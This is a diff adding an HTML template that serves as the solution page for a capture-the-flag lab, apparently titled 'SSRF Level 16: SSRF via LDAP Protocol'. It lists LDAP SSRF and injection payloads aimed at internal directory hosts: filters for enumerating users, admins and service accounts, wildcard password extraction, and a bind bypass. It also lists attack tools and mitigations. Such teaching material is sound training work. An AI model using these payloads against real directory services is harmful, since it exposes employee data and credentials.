@@ -1,0 +1,136 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 16 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 16 Solution: SSRF via LDAP Protocol</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates SSRF vulnerabilities through LDAP injection, allowing attackers to query internal directory services and extract sensitive organizational data.</p>
+
+                <h4>Step-by-Step Solution:</h4>
+                <ol>
+                    <li><strong>Understand LDAP structure:</strong> LDAP uses distinguished names (DN) and search filters</li>
+                    <li><strong>Identify injection points:</strong> LDAP server URL and search query parameters</li>
+                    <li><strong>Craft LDAP queries:</strong> Target internal directory services</li>
+                    <li><strong>Extract directory data:</strong> Enumerate users, groups, and organizational structure</li>
+                </ol>
+
+                <h4>LDAP SSRF Payloads:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># Basic LDAP server targeting
+LDAP Server: ldap://localhost:389
+Query: (&(objectClass=user)(cn=admin))
+
+# Internal directory enumeration
+LDAP Server: ldap://directory.internal.local:389
+Query: (&(objectClass=person)(mail=*))
+
+# LDAPS (secure LDAP) targeting
+LDAP Server: ldaps://internal.ad.company.com:636
+Query: (&(objectClass=organizationalUnit))
+
+# Active Directory targeting
+LDAP Server: ldap://127.0.0.1:389
+Query: (&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=company,DC=local))
+
+# Service account enumeration
+LDAP Server: ldap://internal.ldap.local:389
+Query: (&(objectClass=user)(servicePrincipalName=*))</code></pre>
+                    </div>
+                </div>
+
+                <h4>LDAP Query Techniques:</h4>
+                <ul>
+                    <li><strong>User enumeration:</strong> (&(objectClass=user)(cn=*))</li>
+                    <li><strong>Group discovery:</strong> (&(objectClass=group)(cn=*))</li>
+                    <li><strong>Admin identification:</strong> (&(objectClass=user)(adminCount=1))</li>
+                    <li><strong>Service accounts:</strong> (&(objectClass=user)(servicePrincipalName=*))</li>
+                    <li><strong>Computer objects:</strong> (&(objectClass=computer)(cn=*))</li>
+                </ul>
+
+                <h4>Advanced LDAP Exploitation:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code># LDAP injection in search filters
+Original: (&(objectClass=user)(cn=INPUT))
+Injected: (&(objectClass=user)(cn=*)(description=*))
+
+# Boolean-based LDAP injection
+Query: (&(objectClass=user)(|(cn=admin)(cn=administrator)))
+
+# Wildcard abuse for data extraction
+Query: (&(objectClass=user)(userPassword=*))
+
+# Organizational unit enumeration
+Query: (&(objectClass=organizationalUnit)(ou=*))
+
+# LDAP bind authentication bypass
+Server: ldap://internal.ad.local:389
+Bind DN: cn=admin,dc=company,dc=local
+Password: * (wildcard injection)</code></pre>
+                    </div>
+                </div>
+
+                <h4>LDAP Attribute Extraction:</h4>
+                <ul>
+                    <li><strong>User attributes:</strong> cn, sn, mail, userPassword, memberOf</li>
+                    <li><strong>Computer attributes:</strong> dNSHostName, operatingSystem, lastLogon</li>
+                    <li><strong>Group attributes:</strong> member, description, groupType</li>
+                    <li><strong>Service attributes:</strong> servicePrincipalName, userAccountControl</li>
+                </ul>
+
+                <h4>Tools Required:</h4>
+                <ul>
+                    <li><strong>LDAP query tools:</strong> ldapsearch, Apache Directory Studio</li>
+                    <li><strong>Directory enumeration:</strong> ldapdomaindump, BloodHound</li>
+                    <li><strong>LDAP injection scanners:</strong> Custom scripts and Burp extensions</li>
+                    <li><strong>Active Directory tools:</strong> PowerView, SharpLDAP</li>
+                </ul>
+
+                <h4>Impact:</h4>
+                <ul>
+                    <li>Complete organizational directory enumeration</li>
+                    <li>User and computer account discovery</li>
+                    <li>Administrative account identification</li>
+                    <li>Internal network structure mapping</li>
+                    <li>Potential credential extraction</li>
+                </ul>
+
+                <h4>Real-World Scenarios:</h4>
+                <ul>
+                    <li><strong>Corporate directories:</strong> Employee information leakage</li>
+                    <li><strong>Active Directory:</strong> Domain structure enumeration</li>
+                    <li><strong>Cloud directories:</strong> Azure AD, AWS Directory Service</li>
+                    <li><strong>Application directories:</strong> Custom LDAP implementations</li>
+                </ul>
+
+                <h4>Mitigation:</h4>
+                <ul>
+                    <li>Validate and sanitize all LDAP queries</li>
+                    <li>Implement proper LDAP injection protection</li>
+                    <li>Use parameterized LDAP queries</li>
+                    <li>Restrict LDAP server access to authorized sources</li>
+                    <li>Monitor LDAP query patterns for anomalies</li>
+                </ul>
+
+                <div class="alert alert-warning">
+                    <h5><i class="bi bi-exclamation-triangle-fill me-2"></i>Enterprise Risk</h5>
+                    <p class="mb-0">LDAP SSRF can expose entire organizational structures and user databases. This represents a significant privacy and security risk in enterprise environments.</p>
+                </div>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level16" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level17" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
